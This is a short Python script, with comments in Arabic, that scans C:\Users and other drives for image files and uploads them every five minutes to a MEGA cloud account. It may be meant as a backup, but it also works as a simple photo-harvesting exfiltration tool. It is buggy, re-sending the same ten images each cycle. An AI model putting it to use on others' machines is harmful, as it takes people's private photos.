from mega import Mega
import os
import time

# بيانات تسجيل الدخول إلى حساب MEGA
EMAIL = 'your_mega_email@example.com'
PASSWORD = 'your_mega_password'

# دالة للبحث عن الصور في كل المجلدات
def find_images(base_dirs):
    images = []
    for base_dir in base_dirs:
        for root, dirs, files in os.walk(base_dir):
            for file in files:
                if file.lower().endswith(('jpg', 'jpeg', 'png', 'gif')):
                    images.append(os.path.join(root, file))
    return images

# دالة لرفع الصور إلى MEGA
def upload_images_to_mega(images):
    mega = Mega()
    try:
        # تسجيل الدخول إلى حساب MEGA
        m = mega.login(EMAIL, PASSWORD)
        print("Logged in to MEGA successfully.")
        
        # رفع الصور إلى مجلد "Images" في MEGA
        folder = m.find('Images')  # تأكد من وجود مجلد 'Images' على حسابك في MEGA
        if not folder:
            folder = m.create_folder('Images')
        
        for image in images:
            print(f"Uploading {image} to MEGA...")
            m.upload(image, folder[0])  # رفع الصورة إلى المجلد
        
        print("All images have been uploaded successfully.")
    except Exception as e:
        print(f"Failed to upload images: {e}")

def main():
    # تحديد جميع محركات الأقراص المتاحة
    base_dirs = ["C:\\Users", "D:\\", "E:\\", "F:\\"]  # أضف المزيد إذا كان لديك أقراص إضافية
    while True:
        images = find_images(base_dirs)
        if images:
            print(f"Found {len(images)} images. Uploading the first 10 to MEGA.")
            upload_images_to_mega(images[:10])  # رفع أول 10 صور فقط
        else:
            print("No images found.")
        time.sleep(300)  # الانتظار لمدة 5 دقائق

if __name__ == "__main__":
    main()
